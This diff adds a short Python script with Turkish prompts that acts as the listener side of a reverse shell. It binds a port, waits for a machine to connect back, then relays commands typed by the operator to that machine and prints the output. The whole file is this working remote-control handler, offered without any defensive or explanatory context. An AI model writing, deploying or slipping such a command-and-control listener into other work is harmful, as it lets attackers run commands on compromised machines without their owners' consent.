@@ -1,0 +1,31 @@
+import socket
+
+PORT = int(input("Dinlenecek port gir: "))
+s = socket.socket()
+try:
+    s.bind(("0.0.0.0", PORT))
+    s.listen(1)
+    print(f"[✓] Dinleniyor: 0.0.0.0:{PORT}")
+except Exception as e:
+    print(f"[!] Port hatasi: {e}")
+    exit()
+
+try:
+    client, addr = s.accept()
+    print(f"[✓] Baglandi: {addr}")
+    print(client.recv(1024).decode())
+except Exception as e:
+    print(f"[!] Baglanti hatasi: {e}")
+    exit()
+
+while True:
+    try:
+        komut = input("Komut > ")
+        client.send(komut.encode())
+        if komut == "exit":
+            break
+        cevap = client.recv(4096).decode()
+        print(cevap)
+    except Exception as e:
+        print(f"[-] Baglanti koptu: {e}")
+        break
